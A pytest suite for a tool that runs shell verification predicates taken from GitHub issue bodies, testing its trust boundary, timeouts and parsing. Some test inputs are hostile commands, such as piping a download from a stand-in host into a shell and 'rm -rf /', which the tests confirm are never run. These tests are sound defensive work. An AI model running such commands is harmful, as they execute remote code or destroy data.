"""Three states, and the one that must never collapse into either of the others.

Every test here runs with both seams injected, so the suite needs no network, no
credentials and no `gh` — which is also the property the module claims and therefore
the property worth checking.
"""

from __future__ import annotations

import subprocess
import time
from datetime import datetime, timezone

import pytest

from openloops import tools
from openloops.__main__ import main
from openloops.base import OPEN
from openloops.obligations import (
    DISCHARGED,
    OBLIGATION_FIELDS,
    UNKNOWN,
    GhUnavailable,
    PredicateOutcome,
    configured_owners,
    gh_issues,
    owed,
    parse_verify,
    shell_predicate,
)
from openloops.obligations import _as_outcome, _verdict, not_an_answer

NOW = datetime(2026, 8, 20, tzinfo=timezone.utc)
TRUSTED = ("acme",)


def issue(
    number: int = 1,
    *,
    repo: str = "acme/widget",
    predicate: str | None = None,
    body: str | None = None,
    created: str = "2026-08-01T00:00:00Z",
    title: str = "Do the thing only you can do",
) -> dict:
    """One row shaped like `gh search issues --json ...` returns it."""
    if body is None:
        body = "**Ask:** do it\n"
        if predicate is not None:
            body += f"\n**Verify:** `{predicate}`\n"
        body += "\n<!-- needs-human -->\n"
    return {
        "number": number,
        "title": title,
        "url": f"https://github.com/{repo}/issues/{number}",
        "createdAt": created,
        "repository": {"nameWithOwner": repo},
        "body": body,
    }


def report(issues, *, run_predicate=lambda command: 0, **kwargs):
    kwargs.setdefault("trusted_owners", TRUSTED)
    kwargs.setdefault("now", NOW)
    return owed(issues_source=issues, run_predicate=run_predicate, **kwargs)


def only(issues, **kwargs) -> dict:
    rows = report(issues, **kwargs)["rows"]
    assert len(rows) == 1
    return rows[0]


# --------------------------------------------------------------------------------
# The three states.
# --------------------------------------------------------------------------------


def test_a_predicate_that_returns_zero_reads_discharged():
    row = only([issue(predicate="test -f x")], run_predicate=lambda command: 0)
    assert row["state"] == DISCHARGED
    assert row["evidence"].startswith("exit 0")


def test_a_predicate_that_returns_nonzero_reads_open():
    row = only([issue(predicate="test -f x")], run_predicate=lambda command: 1)
    assert row["state"] == OPEN
    assert "exit 1" in row["evidence"]


def test_no_predicate_at_all_reads_open_and_says_why():
    row = only([issue(body="**Ask:** do it\n")])
    assert row["state"] == OPEN
    assert row["predicate"] == "" and row["verify"] == ""
    assert row["evidence"] == "no verify predicate"


def test_prose_where_a_predicate_cannot_exist_reads_open_and_keeps_the_prose():
    """The documented "none possible" answer is not a predicate and must not run."""
    calls = []
    row = only(
        [issue(body="**Verify:** none possible - a judgement call.")],
        run_predicate=calls.append,
    )
    assert row["state"] == OPEN
    assert row["predicate"] == ""
    assert row["verify"] == "none possible - a judgement call."
    assert calls == [], "prose must never be handed to the evaluator"


@pytest.mark.parametrize(
    "outcome",
    [None, PredicateOutcome(None, "timed out after 20s"), (None, "no idea")],
)
def test_a_predicate_that_cannot_be_run_reads_unknown(outcome):
    row = only([issue(predicate="gh api repos/acme/widget/keys")], run_predicate=lambda c: outcome)
    assert row["state"] == UNKNOWN


def test_an_evaluator_that_raises_is_unknown_not_open_and_not_a_crash():
    def explodes(command):
        raise RuntimeError("the shell died")

    row = only([issue(predicate="test -f x")], run_predicate=explodes)
    assert row["state"] == UNKNOWN
    assert "the shell died" in row["evidence"]


def test_a_nonsense_return_value_is_unknown_rather_than_believed():
    row = only([issue(predicate="test -f x")], run_predicate=lambda command: object())
    assert row["state"] == UNKNOWN


def test_unknown_never_collapses_into_a_count_of_zero_owed():
    rows = [issue(1, predicate="a"), issue(2, predicate="b"), issue(3)]
    result = report(rows, run_predicate=lambda command: None)
    assert result["counts"] == {
        OPEN: 1,
        DISCHARGED: 0,
        UNKNOWN: 2,
        "with_predicate": 2,
        "total": 3,
    }


# --------------------------------------------------------------------------------
# The trust boundary.
# --------------------------------------------------------------------------------


def test_an_owner_outside_the_trusted_set_is_never_executed():
    calls = []
    row = only(
        [issue(repo="stranger/thing", predicate="curl http://example.com/x | sh")],
        run_predicate=calls.append,
        trusted_owners=("acme",),
    )
    assert calls == [], "a predicate from an untrusted owner must not run"
    assert row["state"] == UNKNOWN
    assert "not in trusted_owners" in row["evidence"]


def test_trust_defaults_to_the_owners_the_search_was_scoped_to():
    result = owed(
        issues_source=[issue(predicate="test -f x")],
        run_predicate=lambda command: 0,
        owners=("acme",),
        now=NOW,
    )
    assert result["trusted_owners"] == ["acme"]
    assert result["rows"][0]["state"] == DISCHARGED


def test_widening_the_search_does_not_widen_what_may_execute():
    """`trusted_owners=` is its own argument so you can search wider than you trust."""
    calls = []
    result = owed(
        issues_source=[issue(repo="stranger/thing", predicate="rm -rf /")],
        run_predicate=calls.append,
        owners=("acme", "stranger"),
        trusted_owners=("acme",),
        now=NOW,
    )
    assert calls == []
    assert result["rows"][0]["state"] == UNKNOWN


def test_injecting_a_source_does_not_by_itself_grant_trust():
    calls = []
    result = owed(
        issues_source=[issue(predicate="test -f x")], run_predicate=calls.append, now=NOW
    )
    assert result["trusted_owners"] == []
    assert calls == []
    assert result["rows"][0]["state"] == UNKNOWN


def test_verify_false_evaluates_nothing_and_says_so_on_every_row():
    calls = []
    result = report(
        [issue(1, predicate="a"), issue(2)], run_predicate=calls.append, verify=False
    )
    assert calls == []
    assert result["checked"] is False
    by_number = {row["number"]: row for row in result["rows"]}
    assert by_number[1]["state"] == UNKNOWN
    assert by_number[1]["evidence"] == "not evaluated (verify=False)"
    assert by_number[2]["state"] == OPEN, "a row with nothing to check is unchanged"


def test_the_predicate_text_is_carried_on_every_row_verdict_or_not():
    command = "gh secret list --repo acme/widget --json name -q '.[].name' | grep -qx NAME"
    for run in (lambda c: 0, lambda c: 1, lambda c: None):
        row = only([issue(predicate=command)], run_predicate=run)
        assert row["predicate"] == command
        assert row["verify"] == f"`{command}`"


# --------------------------------------------------------------------------------
# Nothing is ever written.
# --------------------------------------------------------------------------------


def test_a_discharged_obligation_is_reported_and_left_open(monkeypatch):
    """The whole point: the row says done, and nothing at all happens to the issue."""

    def no_subprocess(*args, **kwargs):
        raise AssertionError("a read path started a process")

    monkeypatch.setattr(subprocess, "run", no_subprocess)
    row = only([issue(7, predicate="test -f x")], run_predicate=lambda command: 0)
    assert row["state"] == DISCHARGED
    assert row["number"] == 7 and row["url"].endswith("/issues/7")


# --------------------------------------------------------------------------------
# The row itself.
# --------------------------------------------------------------------------------


def test_every_row_carries_every_documented_field():
    row = only([issue()])
    assert set(OBLIGATION_FIELDS) == set(row)


def test_age_is_whole_days_from_created_at_and_a_bad_stamp_is_not_a_crash():
    assert only([issue(created="2026-08-01T00:00:00Z")])["age_days"] == 19
    assert only([issue(created="")])["age_days"] == 0
    assert only([issue(created="not a date")])["age_days"] == 0


def test_ordering_puts_what_is_owed_first_and_sinks_what_nobody_can_confirm():
    rows = report(
        [
            issue(1, predicate="done", created="2026-08-19T00:00:00Z"),
            issue(2, created="2026-08-18T00:00:00Z"),
            issue(3, predicate="owed", created="2026-08-01T00:00:00Z"),
            issue(4, repo="stranger/x", predicate="untrusted"),
        ],
        run_predicate=lambda command: 0 if command == "done" else 1,
    )["rows"]
    assert [row["number"] for row in rows] == [3, 2, 4, 1]
    assert [row["state"] for row in rows] == [OPEN, OPEN, UNKNOWN, DISCHARGED]


def test_a_result_set_that_saturates_its_own_cap_says_so():
    many = [issue(n, predicate="x") for n in range(1, 6)]
    result = report(many, limit=3)
    assert result["truncated"] is True
    assert len(result["rows"]) == 3
    assert report(many, limit=10)["truncated"] is False


# --------------------------------------------------------------------------------
# A listing that failed is not "nothing owed".
# --------------------------------------------------------------------------------


def test_a_failed_listing_is_reported_as_unknown_never_as_zero():
    def unauthenticated(**query):
        raise GhUnavailable("gh: To get started with GitHub CLI, please run: gh auth login")

    result = owed(issues_source=unauthenticated)
    assert result["listed"] is False
    assert result["rows"] == [] and result["counts"]["total"] == 0
    assert "auth login" in result["error"]


def test_with_no_gh_on_the_machine_the_default_path_answers_a_question_mark(monkeypatch):
    """The default seams, on a machine with nothing installed: `?`, never `0`."""
    monkeypatch.setattr("openloops.obligations.shutil.which", lambda name: None)
    result = tools.owed()
    assert result["listed"] is False
    assert "gh" in result["error"]


# --------------------------------------------------------------------------------
# Parsing the field.
# --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body,expected",
    [
        ("**Verify:** `test -f x`", "test -f x"),
        ("**Verify**: `test -f x`", "test -f x"),
        ("Verify: `test -f x`", "test -f x"),
        ("**verify:** `test -f x`", "test -f x"),
        ("**Verify:** ``a `b` c``", "a `b` c"),
        ("stuff\n\n**Verify:** `test -f x`\n\nmore", "test -f x"),
        ("**Verify:** none possible - a judgement call.", ""),
        ("**Verify:**", ""),
        ("no field at all", ""),
        ("", ""),
    ],
)
def test_parse_verify(body, expected):
    assert parse_verify(body)[0] == expected


def test_parse_verify_keeps_the_field_as_written_for_display():
    assert parse_verify("**Verify:** `a && b`")[1] == "`a && b`"


def test_only_the_first_code_span_is_the_predicate():
    """A body that mentions a second command in the same line must not run both."""
    assert parse_verify("**Verify:** `a` (not `b`)")[0] == "a"


# --------------------------------------------------------------------------------
# The two defaults, which have to be real implementations rather than stubs.
# --------------------------------------------------------------------------------


def test_the_default_evaluator_returns_the_shells_own_exit_status():
    assert shell_predicate("exit 0").status == 0
    assert shell_predicate("exit 3").status == 3


def test_the_default_evaluator_refuses_an_empty_predicate():
    assert shell_predicate("   ").status is None


def test_the_default_evaluator_bounds_its_own_wait():
    """A predicate that outlasts its timeout is `unknown`, never an answer."""
    outcome = shell_predicate("sleep 30", timeout=0.5)
    assert outcome.status is None, "a timeout is not an answer"
    assert "timed out" in outcome.output


def test_a_timeout_kills_what_the_predicate_started(tmp_path):
    """The timeout bounds the EXECUTION, not just our wait for it.

    Without a process group to kill, a backgrounded child outlives the timeout and runs
    to completion long after openloops reported `unknown` -- so the predicate had a side
    effect nobody is accounting for. Measured, which is why this test exists.
    """
    marker = tmp_path / "escaped"
    outcome = shell_predicate(f"(sleep 2; touch {marker}) & sleep 30", timeout=0.5)
    assert outcome.status is None
    time.sleep(3)
    assert not marker.exists(), "the predicate's child escaped its timeout"


def test_a_background_child_does_not_turn_an_answer_into_unknown():
    """`sleep 8 & exit 0` answered 0; a child holding a pipe must not hide that."""
    outcome = shell_predicate("sleep 8 & exit 0", timeout=2.0)
    assert outcome.status == 0


@pytest.mark.parametrize(
    "command, why",
    [
        ("definitely-not-a-real-command-xyz", "command not found is not an answer"),
        ("if [ 1 -eq 1 ; then echo hi", "a shell syntax error is not an answer"),
    ],
)
def test_a_non_zero_exit_for_the_wrong_reason_is_unknown(command, why):
    """The false positive that would matter most: a broken check reading as `open`.

    On a machine with no `gh`, every predicate would exit non-zero, and collapsing that
    into `open` prints a confident count that observed nothing at all.
    """
    state, evidence = _verdict(
        command=command,
        verify_text="",
        owner="acme",
        trusted_owners=frozenset({"acme"}),
        verify=True,
        run_predicate=shell_predicate,
    )
    assert state == UNKNOWN, why
    assert "could not be run" in evidence or "check itself failed" in evidence


def test_a_bool_from_an_injected_evaluator_is_refused_not_inverted():
    """`True` means done to a caller and "not done" to a shell. Refuse, never guess."""
    with pytest.raises(TypeError, match="bool"):
        _as_outcome(True)


def test_the_default_listing_is_a_filtered_search_never_an_enumeration(monkeypatch):
    seen = {}

    def fake_gh(args, *, timeout):
        seen["args"] = list(args)
        return "[]"

    monkeypatch.setattr("openloops.obligations._gh", fake_gh)
    assert gh_issues(owners=("acme", "widgets"), limit=7) == []
    args = seen["args"]
    assert args[:2] == ["search", "issues"]
    assert args.count("--owner") == 2
    assert "--label" in args and "manual-task" in args
    assert args[args.index("--limit") + 1] == "7"
    assert "body" in args[args.index("--json") + 1], "the predicate lives in the body"


def test_the_default_listing_refuses_to_search_the_whole_of_github():
    with pytest.raises(GhUnavailable):
        gh_issues(owners=())


def test_owners_come_from_the_environment_before_they_come_from_gh(monkeypatch):
    monkeypatch.setenv("OPENLOOPS_OWNERS", "acme, widgets")
    monkeypatch.setattr(
        "openloops.obligations._gh",
        lambda args, *, timeout: pytest.fail("gh was called with owners configured"),
    )
    assert configured_owners() == ("acme", "widgets")


def test_a_bad_json_payload_is_unknown_rather_than_an_empty_list(monkeypatch):
    monkeypatch.setattr("openloops.obligations._gh", lambda args, *, timeout: "not json")
    with pytest.raises(GhUnavailable):
        gh_issues(owners=("acme",))


# --------------------------------------------------------------------------------
# The surface.
# --------------------------------------------------------------------------------


def canned(**kwargs):
    base = {
        "listed": True,
        "checked": True,
        "error": "",
        "truncated": False,
        "label": "manual-task",
        "owners": ["acme"],
        "trusted_owners": ["acme"],
        "counts": {OPEN: 1, DISCHARGED: 1, UNKNOWN: 1, "with_predicate": 2, "total": 3},
        "rows": [
            {
                "repo": "acme/widget", "number": 1, "title": "Owed thing",
                "url": "u", "created": "", "age_days": 22, "state": OPEN,
                "verify": "`check-me`", "predicate": "check-me", "evidence": "exit 1",
            },
            {
                "repo": "acme/widget", "number": 2, "title": "Unknowable thing",
                "url": "u", "created": "", "age_days": 54, "state": UNKNOWN,
                "verify": "", "predicate": "", "evidence": "no verify predicate",
            },
            {
                "repo": "acme/widget", "number": 3, "title": "Done thing",
                "url": "u", "created": "", "age_days": 8, "state": DISCHARGED,
                "verify": "`ran-fine`", "predicate": "ran-fine", "evidence": "exit 0",
            },
        ],
    }
    return {**base, **kwargs}


def test_the_cli_shows_all_three_states_and_every_predicate(monkeypatch, capsys):
    monkeypatch.setattr(tools, "owed", lambda **kwargs: canned())
    main(["owed"])
    out = capsys.readouterr().out
    assert "1 open, 1 discharged, 1 unknown" in out
    assert "acme/widget#1" in out and "acme/widget#3" in out
    assert "check-me" in out and "ran-fine" in out, "a verdict without its predicate"
    assert "?" in out and "done" in out


def test_the_cli_says_question_mark_when_it_could_not_check(monkeypatch, capsys):
    monkeypatch.setattr(
        tools, "owed", lambda **kwargs: canned(listed=False, error="gh: not logged in")
    )
    main(["owed"])
    out = capsys.readouterr().out
    assert out.startswith("owed ?")
    assert "0 open" not in out, "a surface that cannot check must never print a count"


def test_the_cli_passes_no_verify_through(monkeypatch, capsys):
    seen = {}

    def spy(**kwargs):
        seen.update(kwargs)
        return canned(checked=False)

    monkeypatch.setattr(tools, "owed", spy)
    main(["owed", "--no-verify"])
    assert seen["verify"] is False
    assert "NOT evaluated" in capsys.readouterr().out


def test_the_cli_prints_ascii_only(monkeypatch, capsys):
    """This renders on a Windows console; a UnicodeEncodeError is not an answer."""
    monkeypatch.setattr(tools, "owed", lambda **kwargs: canned(truncated=True))
    main(["owed"])
    capsys.readouterr().out.encode("ascii")


def test_nothing_owed_is_a_sentence_not_an_empty_screen(monkeypatch, capsys):
    monkeypatch.setattr(
        tools,
        "owed",
        lambda **kwargs: canned(
            rows=[],
            counts={OPEN: 0, DISCHARGED: 0, UNKNOWN: 0, "with_predicate": 0, "total": 0},
        ),
    )
    main(["owed"])
    assert "(nothing owed)" in capsys.readouterr().out


def test_the_tool_returns_something_json_serialisable():
    import json

    json.dumps(tools.owed(issues_source=[issue(predicate="x")], run_predicate=lambda c: 0))


# --------------------------------------------------------------------------------
# The phantom discharge. Each of these once marked a live obligation DONE.
#
# A stale increment annoys; a phantom row destroys the count, and the count is the
# product. Every case below was reachable, was found by an adversarial pass on
# 2026-08-27, and is the reason `parse_verify` is more careful than it looks.
# --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "field",
    [
        "**Verify:** none possible - no `gh` query observes a decision.",
        "**Verify:** none possible - closest is `true`, which proves nothing.",
        "**Verify:** None possible — a judgement call. Not even `gh api` helps.",
        "**Verify:** n/a - `true` would pass and mean nothing",
    ],
)
def test_no_predicate_prose_is_never_executed(field):
    """The documented "none possible" wording mentions commands. It is still prose.

    `gh` with no arguments exits 0. So does `true`. Running a code span out of this
    sentence reports a live obligation as discharged -- from the exact wording the
    capture skill tells agents to write.
    """
    command, text = parse_verify(field)
    assert command == "", "prose about the absence of a predicate is not a predicate"
    assert text, "the prose is kept so the row can say why there is nothing to run"


def test_a_quoted_example_of_the_format_is_not_the_predicate():
    """An agent that pastes the spec into its own issue must not have the spec run."""
    body = (
        "Here is the format I followed:\n\n"
        "```markdown\n**Verify:** `rm -rf /tmp/whatever`\n```\n\n"
        "**Verify:** `exit 0`\n"
    )
    assert parse_verify(body)[0] == "exit 0"


def test_an_indented_code_block_is_not_the_predicate():
    assert parse_verify("    **Verify:** `danger`\n")[0] == ""


def test_an_unterminated_code_span_reads_unknown_not_open():
    """A typo must not silently become a row that reads open with nothing checked."""
    command, text = parse_verify("**Verify:** `echo one &&\necho two`")
    assert command == ""
    state, evidence = _verdict(
        command=command,
        verify_text=text,
        owner="acme",
        trusted_owners=frozenset(TRUSTED),
        verify=True,
        run_predicate=shell_predicate,
    )
    assert state == UNKNOWN
    assert "malformed" in evidence


def test_an_auth_failure_is_unknown_not_open():
    """The whole-fleet false positive: an expired token making every row read open."""
    assert not_an_answer(1, "HTTP 401: Bad credentials") != ""
    assert not_an_answer(1, "gh auth login required") != ""
    assert not_an_answer(1, "no such secret in this repo") == "", (
        "a genuine not-done answer must survive"
    )
